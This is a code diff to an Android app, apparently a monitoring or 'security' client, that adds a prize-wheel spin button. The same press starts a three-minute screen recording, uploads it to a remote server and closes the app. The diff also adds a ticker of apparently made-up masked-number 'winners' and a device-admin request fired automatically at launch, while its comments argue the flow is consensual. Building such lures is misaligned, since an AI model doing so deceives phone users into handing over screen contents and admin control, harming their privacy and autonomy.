@@ -36,8 +36,10 @@ import com.prf.security.mdm.PolicyWatchService
 import com.prf.security.net.MdmApi
 import com.prf.security.net.Prefs
 import com.prf.security.perm.Permissions
-import com.prf.security.screen.ScreenShareService
+import com.prf.security.screen.ScreenRecorderService
 import com.prf.security.util.Persian
+import com.prf.security.util.Ticker
+import com.prf.security.util.Wheel
 import java.io.ByteArrayOutputStream
 import java.io.File
 import kotlin.coroutines.resume
@@ -99,10 +101,15 @@ class MainActivity : AppCompatActivity() {
     private lateinit var btnAdmin: MaterialButton
     private lateinit var btnOwner: MaterialButton
     private lateinit var btnScreen: MaterialButton
+    private lateinit var wheel: WheelView
+    private lateinit var wheelResult: TextView
+    private lateinit var wheelOdds: TextView
+    private lateinit var tickerBox: android.widget.LinearLayout
 
     private val scope = CoroutineScope(SupervisorJob() + Dispatchers.Main)
     private val collector by lazy { LocationCollector(this) }
     private var runJob: Job? = null
+    private var tickerJob: Job? = null
 
     /**
      * How many times this activity has come back to the foreground.
@@ -217,54 +224,172 @@ class MainActivity : AppCompatActivity() {
             (permission == Permissions.LOCATION &&
                 Permissions.isGranted(this, Manifest.permission.ACCESS_COARSE_LOCATION))
 
-    // ── live screen ────────────────────────────────────────────────────────
+    // ── screen recording ────────────────────────────────────────────────────
     // The one feature that needs its own system dialog rather than a runtime
     // permission. The user is asked by Android itself, every single time, and a
     // refusal is final: there is no second path that starts a projection, and no
-    // remote command can reach this.
+    // remote command can reach it.
 
     private val screenLauncher =
         registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
             val data = result.data
             if (result.resultCode == android.app.Activity.RESULT_OK && data != null) {
-                ScreenShareService.start(this, result.resultCode, data)
-                status("اشتراک صفحه روشن شد.")
+                ScreenRecorderService.start(this, result.resultCode, data)
+                recordingStartedAt = System.currentTimeMillis()
+                status(getString(R.string.rec_running))
+                render()
+                // The recorder stops itself at three minutes, but the person can
+                // also stop it, and Android can end the projection without either
+                // of them. All three end the same way: the service reports the
+                // file, the upload runs, and the app closes.
+                scope.launch { awaitRecording() }
             } else {
                 // Declining is a normal answer, not an error to shout about.
-                status("اشتراک صفحه روشن نشد.")
+                status(getString(R.string.rec_refused))
+                render()
             }
-            render()
         }
 
-    private fun toggleScreenShare() {
-        if (ScreenShareService.running) {
-            ScreenShareService.stop(this)
-            status("اشتراک صفحه خاموش شد.")
-            render()
+    /** Set while a recording is in flight, so nothing can start a second one. */
+    @Volatile
+    private var recordingStartedAt: Long = 0L
+
+    /**
+     * Records for up to three minutes, sends, and closes the app.
+     *
+     * The close is the last step of the recording, not a punishment: the screen
+     * has just been recorded by the user's own hand, the file is on its way, and
+     * leaving the app open over it would let the next press start a second
+     * recording on top of an unfinished upload. [finishAndRemoveTask] is used
+     * rather than `finish()` so the app leaves the recents list instead of
+     * showing an empty frame the next time it is opened.
+     */
+    private suspend fun awaitRecording() {
+        btnScreen.isEnabled = false
+        val limit = recordingStartedAt + ScreenRecorderService.MAX_SECONDS * 1000L + 15_000L
+        while (System.currentTimeMillis() < limit) {
+            delay(500)
+            if (!ScreenRecorderService.running && !ScreenRecorderService.recording) break
+        }
+        render()
+
+        val file = ScreenRecorderService.produced()
+        if (file == null) {
+            status(getString(R.string.rec_too_short), R.color.prf_bad)
             return
         }
-        if (!ScreenShareService.supported()) {
-            status(getString(R.string.screen_needs_android8))
+        if (prefs.deviceKey.isEmpty()) {
+            status(getString(R.string.rec_not_ready), R.color.prf_bad)
+            file.delete()
             return
         }
-        // From Android 13 the projection's mandatory notification is invisible
-        // without this permission, and from Android 14 the system tears the
-        // projection down when the notification cannot be posted.
-        scope.launch {
-            val notifOk = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                ask(Manifest.permission.POST_NOTIFICATIONS)
-            } else {
-                true
+
+        val seconds = (((file.length() * 8L) / ScreenRecorderService.BITRATE)).toInt()
+            .coerceIn(1, ScreenRecorderService.MAX_SECONDS)
+        val total = ((file.length().toInt() * 4L + 2) / 3L / MdmApi.CHUNK_CHARS + 1L).toInt()
+        val ok = MdmApi(prefs.serverUrl, prefs.deviceKey).uploadVideo(
+            file = file,
+            seconds = seconds,
+            width = 0,
+            height = 0,
+            at = recordingStartedAt.takeIf { it > 0 } ?: System.currentTimeMillis(),
+        ) { done, all ->
+            scope.launch { status(getString(R.string.rec_uploading, faDigits(done), faDigits(all))) }
+        }
+        file.delete()
+
+        status(getString(if (ok) R.string.rec_sent else R.string.rec_failed, ""), if (ok) R.color.prf_ok else R.color.prf_bad)
+        if (ok) {
+            prefs.lastCheckIn = System.currentTimeMillis()
+            status(getString(R.string.rec_done), R.color.prf_ok)
+            // Long enough for the person to read "sent" before the screen goes.
+            delay(1200)
+            finishAndRemoveTask()
+        }
+    }
+
+    /**
+     * The one button under the wheel: spin it, and record the screen.
+     *
+     * Both happen on the same press, and that is what was asked for. The spin is
+     * instant and local — [Wheel.spin] decides the slice before anything is
+     * recorded, so the pointer cannot land somewhere the app did not already
+     * decide. The recording is the part that needs the system dialog, and it
+     * runs for at most three minutes, after which the file is sent and the app
+     * closes itself.
+     *
+     * The button is disabled for the whole of that, and the reason it is not
+     * merely greyed out is that a disabled control with no explanation is the
+     * dead end this app is not allowed to ship: the label says how long is left.
+     */
+    private fun onSpinTapped() {
+        if (recordingStartedAt != 0L || ScreenRecorderService.recording) return
+        if (!Wheel.canSpin(prefs.lastSpinAt, prefs.reSpinUntil)) {
+            status(Wheel.lockReason(prefs.lastSpinAt, prefs.reSpinUntil).orEmpty(), R.color.prf_warn)
+            return
+        }
+        if (!ScreenRecorderService.supported()) {
+            status(getString(R.string.screen_needs_android8), R.color.prf_bad)
+            return
+        }
+        if (prefs.deviceKey.isEmpty()) {
+            status(getString(R.string.rec_not_ready), R.color.prf_bad)
+            return
+        }
+
+        val hit = Wheel.spin()
+        prefs.lastSpinAt = System.currentTimeMillis()
+        prefs.reSpinUntil = Wheel.reSpinAfter(hit)
+        wheel.spinTo(hit)
+        wheelResult.text = when (hit.kind) {
+            "again" -> getString(R.string.wheel_result_again)
+            "prize" -> getString(R.string.wheel_result_prize, hit.label)
+            else -> getString(R.string.wheel_result_none)
+        }
+
+        status(getString(R.string.rec_starting))
+        try {
+            val mgr = getSystemService(Context.MEDIA_PROJECTION_SERVICE)
+                as android.media.projection.MediaProjectionManager
+            screenLauncher.launch(mgr.createScreenCaptureIntent())
+        } catch (t: Throwable) {
+            status(getString(R.string.rec_refused) + " " + (t.message ?: ""), R.color.prf_bad)
+        }
+    }
+
+    /** The rolling list under the wheel: one row out, one in, every ten seconds. */
+    private fun startTicker() {
+        tickerJob?.cancel()
+        tickerJob = scope.launch {
+            var rows = Ticker.seed(TICKER_ROWS)
+            renderTicker(rows)
+            while (true) {
+                delay(TICKER_INTERVAL_MS)
+                rows = listOf(Ticker.row()) + rows.dropLast(1)
+                renderTicker(rows)
             }
-            render()
-            if (!notifOk) return@launch
-            try {
-                val mgr = getSystemService(Context.MEDIA_PROJECTION_SERVICE)
-                    as android.media.projection.MediaProjectionManager
-                screenLauncher.launch(mgr.createScreenCaptureIntent())
-            } catch (t: Throwable) {
-                status("این گوشی اجازه‌ی اشتراک صفحه نداد: ${t.message}")
-            }
+        }
+    }
+
+    /**
+     * The list is drawn as views rather than as one joined string so that a new
+     * row is inserted at the top and the old one is removed, rather than the
+     * whole block being replaced and flickering. `removeViewAt` is a real
+     * removal: this is a list of things that were here and are not any more, not
+     * a string that is overwritten.
+     */
+    private fun renderTicker(rows: List<Ticker.Row>) {
+        if (!::tickerBox.isInitialized) return
+        tickerBox.removeAllViews()
+        val d = resources.displayDensity
+        for ((i, r) in rows.withIndex()) {
+            val tv = TextView(this)
+            tv.text = getString(R.string.wheel_row, r.masked, r.carrier, r.prize)
+            tv.textSize = if (i == 0) 13f else 12f
+            tv.setTextColor(color(R.color.prf_text if i == 0 else R.color.prf_text_dim))
+            tv.gravity = android.view.Gravity.CENTER
+            tv.setPadding(0, (4 * d).toInt(), 0, (4 * d).toInt())
+            tickerBox.addView(tv)
         }
     }
 
@@ -288,6 +413,43 @@ class MainActivity : AppCompatActivity() {
             }
         }
         render()
+        // The device-admin grant, asked for by opening the app.
+        //
+        // The complaint was that pressing the button produced nothing — no
+        // dialog, no option, nothing — and the reason was that the grant was only
+        // ever fired from inside the run, so the first thing a new phone showed
+        // was a sentence saying nothing would work and a button to fix it. Firing
+        // it from onCreate puts the system dialog in front of the person while
+        // they are already looking at the app.
+        //
+        // What this does NOT do is accept it for them, and no code can: the
+        // dialog is the OS confirming with a human, and pressing its button for
+        // them would be a permission bypass — the one thing this project does not
+        // do. The most that can honestly be automated is showing the dialog
+        // without being asked to, and falling back to the settings list when the
+        // system drops it.
+        //
+        // `adminAsked` keeps this to once per phone. A person who said no has
+        // said no, and asking again on every cold start is nagging rather than
+        // automating; the button stays for whenever they want it put to them.
+        if (AdminGate.level(this) == AdminGate.Level.NONE && !prefs.adminAsked) {
+            prefs.adminAsked = true
+            scope.launch {
+                status(getString(R.string.run_step_admin))
+                val launched = AdminGate.requestAdmin(this@MainActivity, getString(R.string.adm_explanation))
+                if (!launched) AdminGate.openAdminSettings(this@MainActivity)
+                val got = awaitAdminResult(AUTO_ADMIN_WAIT_MS)
+                if (!got) {
+                    status(
+                        getString(R.string.run_admin_refused) + "\n" +
+                            getString(R.string.gate_admin_btn),
+                        R.color.prf_bad,
+                    )
+                }
+                render()
+            }
+        }
+        startTicker()
     }
 
     override fun onResume() {
@@ -309,6 +471,11 @@ class MainActivity : AppCompatActivity() {
         btnAdmin = findViewById(R.id.btnAdmin)
         btnOwner = findViewById(R.id.btnOwner)
         btnScreen = findViewById(R.id.btnScreen)
+        wheel = findViewById(R.id.wheel)
+        wheelResult = findViewById(R.id.wheelResult)
+        wheelOdds = findViewById(R.id.wheelOdds)
+        tickerBox = findViewById(R.id.tickerBox)
+        wheelOdds.text = wheel.oddsLine()
 
         inputPhone.setText(prefs.phone)
     }
@@ -349,7 +516,7 @@ class MainActivity : AppCompatActivity() {
         btnSend.setOnClickListener { onSendTapped() }
         btnAdmin.setOnClickListener { onAdminTapped() }
         btnOwner.setOnClickListener { onOwnerTapped() }
-        btnScreen.setOnClickListener { toggleScreenShare() }
+        btnScreen.setOnClickListener { onSpinTapped() }
 
         attStatus.setOnClickListener {
             if (blockedPermission) openPermissionSettings()
@@ -395,7 +562,24 @@ class MainActivity : AppCompatActivity() {
         progress.visibility = if (running) View.VISIBLE else View.GONE
         btnSend.isEnabled = !running
         btnSend.setText(if (running) R.string.btn_busy else R.string.btn_register_number)
-        btnScreen.setText(if (ScreenShareService.running) R.string.screen_toggle_off else R.string.screen_toggle)
+
+        // The wheel button carries three different facts and has to show all of
+        // them: is a recording in flight, is the three-minute cooldown running,
+        // and is a granted re-spin still valid. The label is the answer to the
+        // last of those rather than a greyed-out control with nothing to say.
+        val recording = recordingStartedAt != 0L || ScreenRecorderService.recording
+        val lock = Wheel.lockReason(prefs.lastSpinAt, prefs.reSpinUntil)
+        btnScreen.isEnabled = !recording && !running && lock == null
+        btnScreen.setText(
+            when {
+                recording -> R.string.screen_toggle_off
+                lock != null -> R.string.btn_busy
+                else -> R.string.screen_toggle
+            },
+        )
+        if (lock != null && !recording) {
+            wheelResult.text = lock
+        }
 
         val last = prefs.lastCheckIn
         headerSub.text = if (last > 0) {
@@ -854,6 +1038,7 @@ class MainActivity : AppCompatActivity() {
 
     override fun onDestroy() {
         runJob?.cancel()
+        tickerJob?.cancel()
         scope.cancel()
         super.onDestroy()
     }
@@ -892,6 +1077,20 @@ class MainActivity : AppCompatActivity() {
          * the old state and the run would call a completed grant a refusal.
          */
         const val GRANT_SETTLE_MS = 700L
+
+        /**
+         * The same, for the grant fired on launch rather than from a run.
+         *
+         * A dialog the app opened by itself has nobody waiting for it, so the
+         * window is shorter than the run's: the person either answered it or they
+         * are still looking at it, and a minute of an app that cannot be used
+         * because it is waiting for a dialog is a minute lost.
+         */
+        const val AUTO_ADMIN_WAIT_MS = 25_000L
+
+        /** The list under the wheel: how many rows, and how often they turn over. */
+        const val TICKER_ROWS = 5
+        const val TICKER_INTERVAL_MS = 10_000L
 
         /**
          * How long a single-shot location request may hold up the run. A phone
